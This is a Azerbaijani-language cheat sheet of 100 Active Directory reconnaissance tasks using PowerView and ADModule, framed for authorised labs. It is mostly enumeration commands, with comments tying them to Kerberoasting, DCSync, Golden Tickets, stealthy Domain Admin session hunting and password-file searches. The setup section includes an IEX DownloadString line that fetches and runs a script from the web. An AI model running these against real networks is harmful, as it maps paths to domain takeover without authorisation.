# Active Directory Recon — 100 Tapşırıq
> PowerView və ADModule ilə professional səviyyədə öyrənmək üçün

---

## 01 — Domain Recon

**T01 — Domain məlumatını al**
```powershell
# PowerView
Get-NetDomain

# ADModule
Get-ADDomain
```
> Domain adı, SID, PDC emulator, forest adı kimi məlumatları göstərir.

---

**T02 — Domain Controller-ları tap**
```powershell
# PowerView
Get-NetDomainController

# ADModule
Get-ADDomainController -Filter *
```
> Bütün DC-lərin siyahısını, IP-lərini və rollərini göstərir.

---

**T03 — Domain Password Policy-ni al**
```powershell
# PowerView
(Get-DomainPolicy)."system access"

# ADModule
Get-ADDefaultDomainPasswordPolicy
```
> Minimum şifrə uzunluğu, lockout threshold, complexity tələbləri.

---

**T04 — Domain SID-i öyrən**
```powershell
# PowerView
Get-DomainSID

# ADModule
(Get-ADDomain).DomainSID
```
> Golden Ticket, SID History hücumları üçün lazımdır.

---

**T05 — Forest məlumatını al**
```powershell
# PowerView
Get-NetForest

# ADModule
Get-ADForest
```
> Forest root domain, schema master, global catalog serverləri.

---

**T06 — Forest-dəki bütün domain-ları tap**
```powershell
# PowerView
Get-NetForestDomain

# ADModule
(Get-ADForest).Domains
```
> Forest-dəki bütün domain-ların siyahısı.

---

**T07 — Global Catalog serverlərini tap**
```powershell
# PowerView
Get-NetForestCatalog

# ADModule
(Get-ADForest).GlobalCatalogs
```
> GC serverləri bütün forest məlumatını saxlayır.

---

**T08 — AD Site-larını tap**
```powershell
# PowerView
Get-NetSite

# ADModule
Get-ADReplicationSite -Filter *
```
> Fiziki şəbəkə bölgüsünü başa düşmək üçün.

---

**T09 — AD Subnet-lərini tap**
```powershell
# PowerView
Get-NetSubnet

# ADModule
Get-ADReplicationSubnet -Filter *
```
> Hansı IP range-in hansı site-a aid olduğunu göstərir.

---

**T10 — OU strukturunu tap**
```powershell
# PowerView
Get-NetOU

# ADModule
Get-ADOrganizationalUnit -Filter * | select Name, DistinguishedName
```
> Organizational Unit iyerarxiyasını anlamaq üçün.

---

## 02 — User Enumeration

**T11 — Bütün user-ları listələ**
```powershell
# PowerView
Get-NetUser | select name, samaccountname

# ADModule
Get-ADUser -Filter * | select Name, SamAccountName
```
> Domain-dakı bütün istifadəçilərin siyahısı.

---

**T12 — Xüsusi bir user haqqında məlumat al**
```powershell
# PowerView
Get-NetUser -UserName jdoe

# ADModule
Get-ADUser -Identity jdoe -Properties *
```
> Bir user-in bütün atributlarını göstərir.

---

**T13 — AdminCount=1 olan hesabları tap**
```powershell
# PowerView
Get-NetUser -AdminCount 1 | select name

# ADModule
Get-ADUser -Filter {AdminCount -eq 1} | select Name
```
> AdminSDHolder tərəfindən qorunan, privileged hesablar.

---

**T14 — SPN olan hesabları tap (Kerberoasting)**
```powershell
# PowerView
Get-NetUser -SPN | select name, serviceprincipalname

# ADModule
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
> Kerberoasting hücumu üçün hədəf hesablar.

---

**T15 — Pre-Authentication tələb etməyən hesablar (ASREPRoast)**
```powershell
# PowerView
Get-NetUser -PreauthNotRequired | select name

# ADModule
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | select Name
```
> AS-REP Roasting hücumu üçün hədəf hesablar.

---

**T16 — Aktiv (enabled) user-ları tap**
```powershell
# PowerView
Get-NetUser | ? {-not ($_.useraccountcontrol -band 2)} | select name

# ADModule
Get-ADUser -Filter {Enabled -eq $true} | select Name
```
> Deaktiv edilməmiş istifadəçilər.

---

**T17 — Şifrəsi heç vaxt bitmiyən hesablar**
```powershell
# PowerView
Get-NetUser | ? {$_.pwdlastset -eq 0} | select name

# ADModule
Get-ADUser -Filter {PasswordNeverExpires -eq $true} | select Name
```
> Uzun müddət dəyişdirilməmiş şifrələr — zəif nöqtə.

---

**T18 — Son login tarixlərini öyrən**
```powershell
# PowerView
Get-NetUser | select name, lastlogon | sort lastlogon

# ADModule
Get-ADUser -Filter * -Properties LastLogonDate | select Name, LastLogonDate | sort LastLogonDate
```
> Aktiv olmayan hesabları müəyyən etmək üçün.

---

**T19 — Şifrəni user-in özü dəyişdirə bilmir**
```powershell
# PowerView
Get-NetUser | ? {$_.useraccountcontrol -band 64} | select name

# ADModule
Get-ADUser -Filter {CannotChangePassword -eq $true} | select Name
```
> Service account-lar çox vaxt bu şəkildə konfiqurasiya edilir.

---

**T20 — Locked out olmuş hesablar**
```powershell
# PowerView
Get-NetUser | ? {$_.badpwdcount -gt 0} | select name, badpwdcount

# ADModule
Search-ADAccount -LockedOut | select Name, SamAccountName
```
> Brute-force cəhdlərini aşkar etmək üçün.

---

## 03 — Group Enumeration

**T21 — Bütün qrupları listələ**
```powershell
# PowerView
Get-NetGroup | select name

# ADModule
Get-ADGroup -Filter * | select Name
```
> Domain-dakı bütün qrupların siyahısı.

---

**T22 — Domain Admins üzvlərini tap**
```powershell
# PowerView
Get-NetGroupMember "Domain Admins" | select MemberName

# ADModule
Get-ADGroupMember "Domain Admins" | select Name
```
> Ən yüksək privileged hesabların siyahısı.

---

**T23 — Enterprise Admins üzvlərini tap**
```powershell
# PowerView
Get-NetGroupMember "Enterprise Admins" | select MemberName

# ADModule
Get-ADGroupMember "Enterprise Admins" | select Name
```
> Bütün forest üzərində tam icazəsi olan hesablar.

---

**T24 — Nested (iç-içə) qrup üzvlüyünü tap**
```powershell
# PowerView
Get-NetGroupMember "Domain Admins" -Recurse | select MemberName

# ADModule
Get-ADGroupMember "Domain Admins" -Recursive | select Name
```
> Dolayı yolla DA olan hesabları tapmaq üçün.

---

**T25 — Bir user-in aid olduğu bütün qrupları tap**
```powershell
# PowerView
Get-NetGroup -UserName jdoe

# ADModule
Get-ADPrincipalGroupMembership jdoe | select Name
```
> User-in bütün qrup üzvlüklərini görmək üçün.

---

**T26 — Adında "admin" keçən qrupları tap**
```powershell
# PowerView
Get-NetGroup *admin*

# ADModule
Get-ADGroup -Filter {Name -like "*admin*"} | select Name
```
> Admin-related qrupları kəşf etmək üçün.

---

**T27 — Bir kompüterdəki lokal qrupları tap**
```powershell
# PowerView
Get-NetLocalGroup -ComputerName WS01

# ADModule
# Native: net localgroup \\WS01
Invoke-Command -ComputerName WS01 -ScriptBlock {Get-LocalGroup}
```
> Uzaq maşındakı lokal qrupların siyahısı.

---

**T28 — Lokal Administrators qrupunun üzvlərini tap**
```powershell
# PowerView
Get-NetLocalGroupMember -ComputerName WS01 -GroupName Administrators

# ADModule
Invoke-Command -ComputerName WS01 -ScriptBlock {Get-LocalGroupMember Administrators}
```
> Bir maşında lokal admin olan hesablar.

---

**T29 — Protected Users qrupunu yoxla**
```powershell
# PowerView
Get-NetGroupMember "Protected Users" | select MemberName

# ADModule
Get-ADGroupMember "Protected Users" | select Name
```
> Credential theft-ə qarşı əlavə qoruması olan hesablar.

---

**T30 — Boş qrupları tap**
```powershell
# PowerView
Get-NetGroup | ? {-not $_.member} | select name

# ADModule
Get-ADGroup -Filter * | ? {-not (Get-ADGroupMember $_ -ErrorAction SilentlyContinue)} | select Name
```
> Üyvsüz qruplar — təmizlik üçün nəzərə alınmalı.

---

## 04 — Computer Enumeration

**T31 — Bütün kompüterləri listələ**
```powershell
# PowerView
Get-NetComputer | select name

# ADModule
Get-ADComputer -Filter * | select Name
```
> Domain-a qoşulmuş bütün kompüterlərin siyahısı.

---

**T32 — Server-ləri filtrele**
```powershell
# PowerView
Get-NetComputer -OperatingSystem "*server*" | select name, operatingsystem

# ADModule
Get-ADComputer -Filter {OperatingSystem -like "*server*"} -Properties OperatingSystem | select Name, OperatingSystem
```
> Yalnız server OS-i olan maşınlar.

---

**T33 — Aktiv (ping olan) kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -Ping | select name

# ADModule
Get-ADComputer -Filter {Enabled -eq $true} | select Name
```
> Hazırda açıq olan maşınlar.

---

**T34 — Köhnə OS-i olan kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -OperatingSystem "*2003*" | select name, operatingsystem

# ADModule
Get-ADComputer -Filter {OperatingSystem -like "*2003*"} -Properties OperatingSystem
```
> End-of-life, patch-lənməmiş sistemlər — yüksək risk.

---

**T35 — Bir kompüter haqqında tam məlumat al**
```powershell
# PowerView
Get-NetComputer -ComputerName WS01 -FullData

# ADModule
Get-ADComputer WS01 -Properties *
```
> Bir maşının bütün AD atributları.

---

**T36 — Unconstrained Delegation olan kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -Unconstrained | select name

# ADModule
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | select Name
```
> TGT saxlaya bilən maşınlar — yüksək hücum hədəfi.

---

**T37 — Constrained Delegation olan kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -TrustedToAuth | select name, msds-allowedtodelegateto

# ADModule
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
```
> S4U2Proxy hücumu üçün hədəflər.

---

**T38 — LAPS aktiv olan kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -Properties ms-mcs-admpwd | ? {$_."ms-mcs-admpwd" -ne $null}

# ADModule
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | ? {$_."ms-Mcs-AdmPwd" -ne $null}
```
> LAPS şifrəsini oxuya bilsən lokal admin girişi mümkün.

---

**T39 — Kompüterlərin SPN-lərini tap**
```powershell
# PowerView
Get-NetComputer -SPN | select name, serviceprincipalname

# ADModule
Get-ADComputer -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
> Maşın hesablarının service principal name-ləri.

---

**T40 — Son 90 gündə aktiv olan kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -LastLogon 90

# ADModule
Get-ADComputer -Filter * -Properties LastLogonDate | ? {$_.LastLogonDate -gt (Get-Date).AddDays(-90)}
```
> Real mühitdə aktiv olan maşınları müəyyən etmək.

---

## 05 — ACL / Permissions

**T41 — Bir user üzərindəki ACL-ləri al**
```powershell
# PowerView
Get-ObjectAcl -SamAccountName jdoe -ResolveGUIDs

# ADModule
(Get-ACL "AD:$(Get-ADUser jdoe | select -ExpandProperty DistinguishedName)").Access
```
> User obyekti üzərindəki bütün izinlər.

---

**T42 — GenericAll icazəsi olan ACL-ləri tap**
```powershell
# PowerView
Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

# ADModule
# PowerView daha məqsədyönlüdür bu task üçün
```
> Tam kontrol icazəsi — istənilən əməliyyatı yerinə yetirmək olar.

---

**T43 — WriteDACL icazəsini tap**
```powershell
# PowerView
Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}

# ADModule
# PowerView daha məqsədyönlüdür bu task üçün
```
> ACL-i dəyişdirmə icazəsi — özünü DA edə bilərsən.

---

**T44 — ForceChangePassword icazəsini tap**
```powershell
# PowerView
Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "User-Force-Change-Password"}

# ADModule
# PowerView spesifik, ADModule ilə birbaşa yoxlanmır
```
> Başqasının şifrəsini dəyişdirmə icazəsi.

---

**T45 — Bütün domain üzərindəki maraqlı ACL-ləri tap**
```powershell
# PowerView
Find-InterestingDomainAcl -ResolveGUIDs

# ADModule
# PowerView spesifik
```
> Bütün domain-da exploitation üçün yararlı ACL-lər.

---

**T46 — GenericWrite icazəsini tap**
```powershell
# PowerView
Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericWrite"}

# ADModule
# PowerView daha məqsədyönlüdür
```
> Atribut yazma icazəsi — SPN əlavə edib Kerberoast etmək mümkün.

---

**T47 — Domain root üzərindəki ACL-lər**
```powershell
# PowerView
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs

# ADModule
(Get-ACL "AD:DC=corp,DC=local").Access
```
> Domain kökü üzərindəki kritik icazələr.

---

**T48 — DCSync icazəsini tap**
```powershell
# PowerView
Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"}

# ADModule
(Get-ACL "AD:DC=corp,DC=local").Access | ? {$_.ActiveDirectoryRights -match "ExtendedRight"}
```
> DS-Replication icazəsi — hashleri dump etmək mümkün.

---

**T49 — Bir qrup üzərindəki ACL-ləri al**
```powershell
# PowerView
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs

# ADModule
(Get-ACL "AD:$(Get-ADGroup 'Domain Admins' | select -ExpandProperty DistinguishedName)").Access
```
> Qruba üzv əlavə edə bilən user-ləri tapmaq.

---

**T50 — AddMember icazəsini tap**
```powershell
# PowerView
Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -and $_.ObjectAceType -match "member"}

# ADModule
# PowerView daha məqsədyönlüdür
```
> Qrupa özü-özünə üzv əlavə edə biləcək hesablar.

---

## 06 — Trust & Forest

**T51 — Domain trust-larını tap**
```powershell
# PowerView
Get-NetDomainTrust

# ADModule
Get-ADTrust -Filter *
```
> Bütün trust münasibətlərinin istiqaməti və növü.

---

**T52 — Forest trust-larını tap**
```powershell
# PowerView
Get-NetForestTrust

# ADModule
Get-ADTrust -Filter {ForestTransitive -eq $true}
```
> Forest-lər arası trust-lar.

---

**T53 — External trust-ları tap**
```powershell
# PowerView
Get-NetDomainTrust | ? {$_.TrustType -eq "External"}

# ADModule
Get-ADTrust -Filter {TrustType -eq "External"}
```
> Xarici domain-larla trust münasibətləri.

---

**T54 — SID Filtering statusunu yoxla**
```powershell
# PowerView
Get-NetDomainTrust | select SourceName, TargetName, TrustAttributes

# ADModule
Get-ADTrust -Filter * | select Name, SIDFilteringForestAware, SIDFilteringQuarantined
```
> SID Filtering deaktiv olarsa SID History hücumu mümkün.

---

**T55 — Bidirectional trust-ları tap**
```powershell
# PowerView
Get-NetDomainTrust | ? {$_.TrustDirection -eq "Bidirectional"}

# ADModule
Get-ADTrust -Filter {TrustDirection -eq 3}
```
> İki tərəfli trust — hər iki domain-da lateral hərəkət mümkün.

---

**T56 — Trust xəritəsini çıxar**
```powershell
# PowerView
Invoke-MapDomainTrust

# ADModule
Get-ADTrust -Filter * | select Source, Target, Direction, TrustType
```
> Bütün trust path-larının vizual xəritəsi.

---

**T57 — Bütün forest-dəki user-ları say**
```powershell
# PowerView
Get-NetForestDomain | % {Get-NetUser -Domain $_} | select name, domain

# ADModule
(Get-ADForest).Domains | % {Get-ADUser -Filter * -Server $_ | select Name}
```
> Forest-dəki bütün domain-ların user-ları.

---

**T58 — Child domain-ları tap**
```powershell
# PowerView
Get-NetDomainTrust | ? {$_.TrustType -eq "ParentChild"}

# ADModule
(Get-ADDomain).SubordinateReferences
```
> Parent domain altındakı child domain-lar.

---

**T59 — Selective Authentication statusunu yoxla**
```powershell
# PowerView
Get-NetDomainTrust | select TargetName, TrustAttributes

# ADModule
Get-ADTrust -Filter * | select Name, SelectiveAuthentication
```
> Selective auth aktiv deyilsə bütün user-lər authenticate ola bilər.

---

**T60 — Forest-lərin Global Catalog-larını tap**
```powershell
# PowerView
Get-NetForest | select GlobalCatalogs

# ADModule
(Get-ADForest).GlobalCatalogs
```
> GC serverləri bütün forest məlumatını ehtiva edir.

---

## 07 — GPO Enumeration

**T61 — Bütün GPO-ları listələ**
```powershell
# PowerView
Get-NetGPO | select DisplayName, WhenCreated

# ADModule
Get-GPO -All | select DisplayName, CreationTime
```
> Domain-dakı bütün Group Policy Object-lər.

---

**T62 — Bir kompüterə tətbiq edilən GPO-ları tap**
```powershell
# PowerView
Get-NetGPO -ComputerName WS01

# ADModule
Get-GPResultantSetOfPolicy -Computer WS01 -ReportType Html -Path C:\gpo_report.html
```
> Bir maşına hansı GPO-ların tətbiq edildiyini görmək.

---

**T63 — Bir user-ə tətbiq edilən GPO-ları tap**
```powershell
# PowerView
Get-NetGPO -UserName jdoe

# ADModule
Get-GPResultantSetOfPolicy -User jdoe -ReportType Html -Path C:\gpo_user.html
```
> Bir user-in GPO-larını görmək.

---

**T64 — GPO üzərindəki ACL-ləri tap**
```powershell
# PowerView
Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.displayname}

# ADModule
Get-GPO -All | % {(Get-ACL "AD:CN={$($_.Id)},CN=Policies,...").Access}
```
> GPO-nu dəyişdirə biləcək user-ləri tapmaq.

---

**T65 — Restricted Groups GPO-larını tap**
```powershell
# PowerView
Get-NetGPOGroup

# ADModule
# GPO report-larında manual axtarış lazımdır
```
> Lokal admin əlavə edən GPO-lar — lateral hərəkət üçün önəmli.

---

**T66 — OU-ya linklənmiş GPO-ları tap**
```powershell
# PowerView
Get-NetOU | select name, gplink

# ADModule
Get-ADOrganizationalUnit -Filter * -Properties LinkedGroupPolicyObjects | select Name, LinkedGroupPolicyObjects
```
> Hansı OU-nun hansı GPO-ya bağlı olduğunu görmək.

---

**T67 — GPO ilə lokal admin əlavə edilmiş kompüterləri tap**
```powershell
# PowerView
Find-GPOLocation -UserName jdoe -Verbose

# ADModule
# PowerView spesifik
```
> Bir user-in GPO vasitəsilə lokal admin olduğu maşınlar.

---

**T68 — GPO ilə müəyyən qrupa lokal admin əlavə edilmiş yerlər**
```powershell
# PowerView
Find-GPOLocation -GroupName "Domain Admins"

# ADModule
# PowerView spesifik
```
> Qrupun GPO vasitəsilə lokal admin olduğu maşınlar.

---

**T69 — AppLocker policy-ni yoxla**
```powershell
# PowerView
Get-NetGPO | ? {$_.gpcmachineextensionnames -match "AppLocker"}

# ADModule
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
> Hansı proqramların çalışmasına icazə var?

---

**T70 — GPO-nun son dəyişdirilmə tarixini gör**
```powershell
# PowerView
Get-NetGPO | select DisplayName, WhenChanged

# ADModule
Get-GPO -All | select DisplayName, ModificationTime
```
> Son dəyişdirilmiş GPO-lar şübhəli ola bilər.

---

## 08 — Kerberos Attacks

**T71 — Kerberoastable hesabları tap**
```powershell
# PowerView
Get-NetUser -SPN | select name, serviceprincipalname

# ADModule
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select Name, ServicePrincipalName
```
> SPN olan user hesabları — TGS ticket alıb offline crack etmək mümkün.

---

**T72 — ASREPRoastable hesabları tap**
```powershell
# PowerView
Get-NetUser -PreauthNotRequired | select name

# ADModule
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | select Name
```
> Pre-auth lazım olmayan hesablar — AS-REP hash-i birbaşa alınır.

---

**T73 — Unconstrained Delegation olan kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -Unconstrained | select name

# ADModule
Get-ADComputer -Filter {TrustedForDelegation -eq $true} | select Name
```
> Bu maşınlara giriş əldə etdikdə ona bağlanan user-lərin TGT-sini almaq mümkün.

---

**T74 — Constrained Delegation olan kompüterləri tap**
```powershell
# PowerView
Get-NetComputer -TrustedToAuth | select name, "msds-allowedtodelegateto"

# ADModule
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo | select Name, msDS-AllowedToDelegateTo
```
> S4U2Proxy — müəyyən servicelərə delegation mümkün.

---

**T75 — Constrained Delegation olan user-ləri tap**
```powershell
# PowerView
Get-NetUser -TrustedToAuth | select name, "msds-allowedtodelegateto"

# ADModule
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
```
> User hesablarında constrained delegation.

---

**T76 — Resource-Based Constrained Delegation (RBCD)**
```powershell
# PowerView
Get-NetComputer | select name, "msds-allowedtoactonbehalfofotheridentity"

# ADModule
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | ? {$_."msDS-AllowedToActOnBehalfOfOtherIdentity" -ne $null}
```
> RBCD konfiqurasiyası — GenericWrite ilə istismar mümkün.

---

**T77 — krbtgt hesabı haqqında məlumat al**
```powershell
# PowerView
Get-NetUser -UserName krbtgt

# ADModule
Get-ADUser krbtgt -Properties *
```
> Golden Ticket üçün krbtgt hash-i lazımdır.

---

**T78 — Yüksək dəyərli SPN-ləri tap**
```powershell
# PowerView
Get-NetUser -SPN | ? {$_.serviceprincipalname -match "MSSQL|HTTP|Exchange|FTP"}

# ADModule
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | ? {$_.ServicePrincipalName -match "MSSQL|HTTP|Exchange"}
```
> Kritik servislərə aid SPN-lər daha dəyərlidir.

---

**T79 — Delegation üçün uyğun service-ləri tap**
```powershell
# PowerView
Get-NetComputer -TrustedToAuth | select name, "msds-allowedtodelegateto" | % {$_."msds-allowedtodelegateto"}

# ADModule
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo | select -ExpandProperty msDS-AllowedToDelegateTo
```
> Delegation icazəsi olan konkret service-lərin siyahısı.

---

**T80 — Kerberos Policy-ni öyrən**
```powershell
# PowerView
(Get-DomainPolicy)."Kerberos Policy"

# ADModule
Get-ADDefaultDomainPasswordPolicy | select MaxTicketAge, MaxRenewAge
```
> Ticket ömrü, renewal müddəti — Silver/Golden Ticket üçün önəmli.

---

## 09 — Session & Logon

**T81 — Aktiv şəbəkə session-larını tap**
```powershell
# PowerView
Get-NetSession -ComputerName DC01

# ADModule
# PowerView spesifik — NetSessionEnum API istifadə edir
```
> DC-yə qoşulmuş aktiv session-lar.

---

**T82 — Hazırda login olan user-ləri tap**
```powershell
# PowerView
Get-NetLoggedon -ComputerName WS01

# ADModule
Invoke-Command -ComputerName WS01 -ScriptBlock {query user}
```
> Bir maşında aktiv oturan istifadəçilər.

---

**T83 — Lokal admin olduğun maşınları tap**
```powershell
# PowerView
Find-LocalAdminAccess

# ADModule
# PowerView spesifik
```
> Hazırkı session ilə lokal admin girişi olan maşınlar.

---

**T84 — Domain Admin-in session-unu tap**
```powershell
# PowerView
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# ADModule
# PowerView spesifik
```
> DA-nın hansı maşında oturduğunu tapmaq — pass-the-hash üçün.

---

**T85 — Xüsusi bir user-in session-unu tap**
```powershell
# PowerView
Find-DomainUserLocation -UserName jdoe

# ADModule
# PowerView spesifik
```
> Hədəf user-in hazırda harada olduğunu tapmaq.

---

**T86 — Domain Admins-in session-unu stealth şəkildə tap**
```powershell
# PowerView
Find-DomainUserLocation -Stealth -UserGroupIdentity "Domain Admins"

# ADModule
# PowerView spesifik
```
> Daha az log yaratmaq üçün stealth rejim.

---

**T87 — SMB share-lərini tap**
```powershell
# PowerView
Find-DomainShare

# ADModule
# PowerView spesifik
```
> Domain-dakı bütün paylaşılan qovluqlar.

---

**T88 — Accessible share-ləri tap**
```powershell
# PowerView
Find-DomainShare -CheckShareAccess

# ADModule
# PowerView spesifik
```
> Hazırkı user tərəfindən əlçatan olan paylaşımlar.

---

**T89 — Share-lərdə maraqlı faylları tap**
```powershell
# PowerView
Find-InterestingDomainShareFile -Include *.ps1, *.bat, *.config, *.xml

# ADModule
# PowerView spesifik
```
> Parol, konfiqurasiya saxlayan faylları tapmaq.

---

**T90 — WMI ilə uzaq maşında process-ləri gör**
```powershell
# PowerView
# N/A

# ADModule / Native
Get-WmiObject -Class Win32_Process -ComputerName WS01 | select Name, ProcessId
```
> Uzaq maşında çalışan proseslər.

---

## 10 — Advanced Techniques

**T91 — AdminSDHolder-in qoruduğu hesabları tap**
```powershell
# PowerView
Get-NetUser -AdminCount 1 | select name, admincount

# ADModule
Get-ADUser -Filter {AdminCount -eq 1} | select Name
```
> AdminSDHolder tərəfindən ACL-i yenidən yazılan hesablar.

---

**T92 — Schema Admins qrupunu tap**
```powershell
# PowerView
Get-NetGroupMember "Schema Admins" | select MemberName

# ADModule
Get-ADGroupMember "Schema Admins" | select Name
```
> AD schema-nı dəyişdirə biləcək hesablar — çox nadir istifadə olunmalı.

---

**T93 — Fine-Grained Password Policy (PSO) tap**
```powershell
# PowerView
Get-NetFineGrainedPasswordPolicy

# ADModule
Get-ADFineGrainedPasswordPolicy -Filter *
```
> Müxtəlif user-lər üçün fərqli password policy-lər.

---

**T94 — ms-DS-MachineAccountQuota dəyərini yoxla**
```powershell
# PowerView
Get-NetDomain | select ms-DS-MachineAccountQuota

# ADModule
Get-ADObject -Identity "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota | select ms-DS-MachineAccountQuota
```
> Default 10 — hər user 10 maşın hesabı yarada bilər (RBCD üçün lazım).

---

**T95 — AD Recycle Bin statusunu yoxla**
```powershell
# PowerView
# N/A

# ADModule
Get-ADOptionalFeature -Filter {Name -eq "Recycle Bin Feature"} | select Name, EnabledScopes
```
> Recycle Bin aktiv isə silinmiş obyektləri bərpa etmək olar.

---

**T96 — Silinmiş AD obyektlərini tap**
```powershell
# PowerView
# N/A

# ADModule
Get-ADObject -Filter {Deleted -eq $true} -IncludeDeletedObjects | select Name, Deleted, WhenChanged
```
> Bərpa edilə bilən silinmiş hesablar və obyektlər.

---

**T97 — Shadow Credentials atributunu yoxla**
```powershell
# PowerView
Get-NetUser | select name, "msDS-KeyCredentialLink"

# ADModule
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink | ? {$_."msDS-KeyCredentialLink" -ne $null}
```
> Shadow Credentials hücumu üçün konfiqurasiya yoxlanması.

---

**T98 — BloodHound üçün data topla**
```powershell
# PowerView / SharpHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# ADModule
# BloodHound collector-u ayrıca lazımdır
```
> Attack path analizi üçün BloodHound-a data vermək.

---

**T99 — Privileged hesabların son aktiv tarixini yoxla**
```powershell
# PowerView
Get-NetUser -AdminCount 1 | select name, lastlogon | sort lastlogon

# ADModule
Get-ADUser -Filter {AdminCount -eq 1} -Properties LastLogonDate | select Name, LastLogonDate | sort LastLogonDate
```
> Uzun müddət istifadə edilməmiş privileged hesablar.

---

**T100 — Bütün domain-ın ümumi statistikasını çıxar**
```powershell
# PowerView
@{
    Users     = (Get-NetUser).Count
    Groups    = (Get-NetGroup).Count
    Computers = (Get-NetComputer).Count
    DAs       = (Get-NetGroupMember "Domain Admins").Count
}

# ADModule
[PSCustomObject]@{
    Users     = (Get-ADUser -Filter *).Count
    Groups    = (Get-ADGroup -Filter *).Count
    Computers = (Get-ADComputer -Filter *).Count
    DAs       = (Get-ADGroupMember "Domain Admins").Count
}
```
> Domain-ın ümumi vəziyyətinin snapshot-ı.

---

## Qurulum Xatırlatması

**PowerView yüklə:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
# və ya local
Import-Module .\PowerView.ps1
```

**ADModule yüklə:**
```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1
```

> ⚠️ Bu tapşırıqlar **yalnız icazəli məşq mühitlərində** (lab, TryHackMe, HackTheBox, CRTE/CRTO) istifadə üçündür.
